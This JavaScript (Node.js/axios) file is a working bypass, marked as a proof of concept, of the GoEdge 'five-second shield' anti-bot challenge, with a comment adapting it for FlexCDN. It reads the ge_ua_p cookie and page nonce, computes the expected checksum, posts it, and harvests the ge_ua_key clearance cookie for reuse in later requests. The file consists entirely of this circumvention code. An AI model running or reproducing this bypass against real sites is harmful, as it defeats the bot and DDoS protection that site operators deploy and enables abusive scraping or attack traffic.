const axios = require('axios');
const { URL } = require('url');

function calculateSum(ge_ua_p, nonce) {
    let sum = 0;
    //let sum = 12345;
    //FlexCDN此处改为12345
    for (let i = 0; i < ge_ua_p.length; i++) {
        let char = ge_ua_p[i];
        if (/^[a-zA-Z0-9]$/.test(char)) {
            sum += char.charCodeAt(0) * (nonce + i);
        }
    }
    return sum;
}

async function bypass_ge_ua_p(url, userAgent) {
    try {
        const urlObj = new URL(url);
        const origin = urlObj.origin;
        const referer = urlObj.href;

        const getResponse = await axios.get(url, {
            headers: {
                'User-Agent': userAgent,
                'Origin': origin,
                'Referer': origin,
            },
            withCredentials: true,
        });

        const getCookies = getResponse.headers['set-cookie'];
        if (!getCookies) {
            throw new Error("no cookies 1");
        }

        const geUaPCookie = getCookies.find(cookie => cookie.startsWith('ge_ua_p='));
        if (!geUaPCookie) {
            throw new Error("ge_ua_p not found");
        }
        const geUaPValue = geUaPCookie.split(';')[0].split('=')[1];
        console.log("ge_ua_p", geUaPValue);
        const html = getResponse.data;
        const nonceMatch = html.match(/var nonce = (\d+);/);
        if (!nonceMatch) {
            throw new Error("nonce not found");
        }
        const nonce = parseInt(nonceMatch[1], 10);
        console.log("nonce:", nonce);
        const sum = calculateSum(geUaPValue, nonce);
        console.log("sum:", sum);
        const postData = new URLSearchParams();
        postData.append('sum', sum);
        postData.append('nonce', nonce);
        const postResponse = await axios.post(url, postData.toString(), {
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-GE-UA-Step': 'prev',
                'Cookie': `ge_ua_p=${geUaPValue}`,
                'Origin': origin,
                'Referer': referer,
                'User-Agent': userAgent,
            },
        });
        console.log(postResponse.data);
        const postCookies = postResponse.headers['set-cookie'];
        if (!postCookies) {
            throw new Error("no cookies 2");
        }
        const geUaKeyCookie = postCookies.find(cookie => cookie.startsWith('ge_ua_key='));
        if (!geUaKeyCookie) {
            throw new Error("ge_ua_key not found");
        }
        const geUaKeyValue = geUaKeyCookie.split(';')[0].split('=')[1];
        console.log("ge_ua_key", geUaKeyValue);
        const concatenatedCookies = `ge_ua_p=${geUaPValue}; ge_ua_key=${geUaKeyValue}`;
        if (postResponse.status === 200 && postResponse.data.ok) {
            console.log("passed");
        } else {
            console.warn("failed", postResponse.status);
        }
        const ua = userAgent
        return {
            url: url,
            ua,
            cookies: concatenatedCookies
        };
    } catch (error) {
        console.error(error.message);
        throw error;
    }
}


(async () => {
    const url = "开启goedge五秒盾的url";
    const userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0';
    const result = await bypass_ge_ua_p(url, userAgent);
    //poc
    console.log("-".repeat(50));
    console.log(result);
    console.log("-".repeat(50));
    try {
        const response = await axios.get(result.url, {
            headers: {
                'User-Agent': result.ua,
                'Cookie': result.cookies
            }
        });
        const responseData = response.data;
        const truncatedData = responseData.substring(0, 500);
        console.log(truncatedData);
    } catch (error) { }
})();
